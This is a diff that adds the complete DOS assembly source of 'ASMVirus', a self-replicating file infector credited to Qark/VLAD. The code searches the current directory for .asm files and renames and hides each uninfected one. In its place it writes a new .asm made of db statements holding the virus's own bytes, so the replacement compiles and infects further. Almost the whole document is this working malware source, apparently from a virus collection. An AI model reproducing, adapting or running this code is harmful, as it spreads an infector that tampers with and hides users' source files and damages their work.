@@ -1,0 +1,190 @@
+;~
+;Lame .ASM infector by Qark/VLAD called ASMVirus
+;
+;Searches the current directory for any .ASM files.  When it finds one, 
+;it renames it to a different extension, and writes a .asm made of db
+;statements in its place.  This .asm will compile under tasm/masm/a86, and
+;will run as an EXE or COM.
+;The infection marker is the ;~ at the top of the screen.
+;
+
+casmseg segment
+assume  cs:casmseg,ds:casmseg,ss:casmseg
+org     100h
+.radix 10
+start:
+        push    cs
+        pop     ds
+
+        mov     ah,4eh
+fnext:
+        mov     cx,7
+        mov     dx,offset wild1
+        int     21h
+        jnc     goodfind
+badfind:
+        jmp     noasm
+goodfind:
+        push    es
+        pop     ds
+
+        mov     dx,9eh
+        mov     ax,3d02h
+        int     21h
+        jc      badfind
+        push    cs
+        pop     ds
+        mov     bx,ax
+
+        mov     ah,3fh
+        mov     cx,2
+        mov     dx,offset readbuff
+        int     21h
+
+        cmp     word ptr readbuff,"~;"
+        jne     infect
+        jmp     closefnext
+infect:
+        mov     ah,3eh
+        int     21h
+
+        push    es
+        pop     ds
+
+        push    cs
+        pop     es
+        mov     di,offset newname
+        mov     si,9eh
+
+        cld
+nnmm:
+        lodsb
+        cmp     al,0
+        je      donename
+        stosb
+        jmp     nnmm
+donename:
+        mov     byte ptr es:[di-1],'0'
+        stosb
+
+        mov     ah,56h
+        mov     dx,9eh
+        mov     di,offset newname
+        int     21h
+        jnc     okrename
+        jmp     noasm
+okrename:
+        push    ds
+        push    cs
+        pop     ds
+        mov     dx,offset newname
+        mov     ax,4301h
+        mov     cx,2
+        int     21h
+        pop     ds
+
+        mov     ah,3ch
+        mov     dx,9eh
+        xor     cx,cx
+        int     21h
+
+        mov     bx,ax
+
+        push    cs
+        pop     ds
+
+        mov     ah,40h
+        mov     dx,offset header
+        mov     cx,headerend
+        int     21h
+
+        mov     si,offset start
+nextline:
+        mov     ah,40h
+        mov     dx,offset linestart
+        mov     cx,5
+        int     21h
+
+        mov     bp,10
+nloop:
+        mov     al,byte ptr [si]
+        mov     di,offset numba
+        mov     byte ptr [di],'0'
+        mov     byte ptr [di+1],'0'
+        mov     byte ptr [di+2],'0'
+        add     di,2
+numloop:
+        xor     ah,ah
+        mov     cl,10
+        div     cl
+        add     ah,'0'
+        mov     byte ptr [di],ah
+        dec     di
+        cmp     al,0
+        je      writenum
+        jmp     numloop
+writenum:
+        mov     ah,40h
+        mov     cx,3
+        mov     dx,offset numba
+        int     21h
+
+        inc     si
+        cmp     si,offset virend
+        je      closeet
+        dec     bp
+        jnz     docomma
+        jmp     nextline
+docomma:
+        mov     ah,40h
+        mov     cx,1
+        mov     dx,offset comma
+        int     21h
+        jmp     nloop
+        
+closefnext:
+        mov     ah,3eh
+        int     21h
+        mov     ah,4fh
+        jmp     fnext
+closeet:
+        mov     ah,40h
+        mov     dx,offset ender
+        mov     cx,enderend
+        int     21h
+
+        mov     ah,3eh
+        int     21h
+noasm:
+        mov     ax,4c00h
+        int     21h
+
+        db      "ASMVirus by Qark/VLAD"
+
+numba   db      0,0,0
+
+
+header  db      ";~",0dh,0ah
+        db      "casmseg segment",0dh,0ah
+        db      "assume  cs:casmseg,ds:casmseg,ss:casmseg",0dh,0ah
+        db      "org     100h",0dh,0ah
+        db      ".radix 10",0dh,0ah
+        db      "start:",0dh,0ah
+headerend       equ $-offset header
+
+ender   db      0dh,0ah,"casmseg ends",0dh,0ah
+        db      "end     start",0dh,0ah
+enderend        equ $-offset ender
+
+linestart       db      0dh,0ah,"db "
+
+comma   db      ","
+
+wild1   db      "*.asm",0
+newname db      15 dup (0)
+
+
+readbuff        dw      0
+virend  db      0
+casmseg ends
+end     start
